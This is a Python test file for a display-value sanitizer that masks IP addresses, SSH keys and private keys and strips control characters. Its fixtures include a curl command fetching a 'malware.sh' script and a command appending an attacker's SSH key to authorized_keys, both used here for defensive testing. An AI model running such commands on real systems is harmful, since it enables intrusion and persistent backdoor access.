from sanitizer import sanitize_display_value


def test_ipv4_is_masked():
    assert sanitize_display_value("192.168.1.123") == "192.168.x.x"
    assert sanitize_display_value("1.2.3.4") == "1.2.x.x"


def test_ipv4_with_port_is_masked():
    assert (
        sanitize_display_value("192.168.1.100:8080")
        == "192.168.x.x:8080"
    )


def test_ipv4_inside_url_is_masked():
    assert (
        sanitize_display_value(
            "curl http://192.168.100.55:8080/malware.sh"
        )
        == "curl http://192.168.x.x:8080/malware.sh"
    )


def test_ipv6_is_masked():
    assert (
        sanitize_display_value(
            "2001:db8:1234:5678:abcd:ef01:2345:6789"
        )
        == "2001:db8:1234:5678::x"
    )


def test_compressed_ipv6_is_masked():
    assert (
        sanitize_display_value(
            "2001:db8:1234:5678::1"
        )
        == "2001:db8:1234:5678::x"
    )


def test_loopback_ipv6_is_masked():
    assert sanitize_display_value("::1") == "::x"


def test_ipv4_mapped_ipv6_is_masked():
    assert (
        sanitize_display_value("::ffff:192.168.1.100")
        == "::ffff:192.168.x.x"
    )


def test_ipv6_zone_identifier_is_masked():
    assert (
        sanitize_display_value("fe80::1%eth0")
        == "fe80:0:0:0::x"
    )


def test_ssh_public_key_is_masked():
    value = (
        "ssh-rsa "
        "AAAAB3NzaC1yc2EAAAADAQABAAABAQC1234567890 "
        "attacker@host"
    )

    assert sanitize_display_value(value) == "<SSH_PUBLIC_KEY>"


def test_ssh_public_key_inside_command_is_masked():
    value = (
        'echo "ssh-rsa '
        'AAAAB3NzaC1yc2EAAAADAQABAAABAQC1234567890 '
        'attacker@host" >> .ssh/authorized_keys'
    )

    assert (
        sanitize_display_value(value)
        == 'echo "<SSH_PUBLIC_KEY>" >> .ssh/authorized_keys'
    )


def test_private_key_block_is_masked():
    value = (
        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
        "base64data\n"
        "-----END OPENSSH PRIVATE KEY-----"
    )

    assert sanitize_display_value(value) == "<PRIVATE_KEY>"


def test_control_characters_are_removed():
    assert (
        sanitize_display_value("echo hello\x00world")
        == "echo hello world"
    )


def test_ansi_escape_sequence_is_removed():
    value = "\x1b[31mred text\x1b[0m"

    assert sanitize_display_value(value) == "red text"


def test_whitespace_is_normalized():
    assert (
        sanitize_display_value("  uname    -a  ")
        == "uname -a"
    )

    assert (
        sanitize_display_value("uname\n-a")
        == "uname -a"
    )


def test_length_limit():
    value = "A" * 201

    result = sanitize_display_value(value)

    assert len(result) == 200
    assert result.endswith("…")


def test_values_under_length_limit_are_unchanged():
    value = "A" * 199

    assert sanitize_display_value(value) == value


def test_html_is_preserved():
    value = "<script>alert('hello')</script>"

    assert sanitize_display_value(value) == value


def test_normal_command_is_preserved():
    value = "uname -a"

    assert sanitize_display_value(value) == value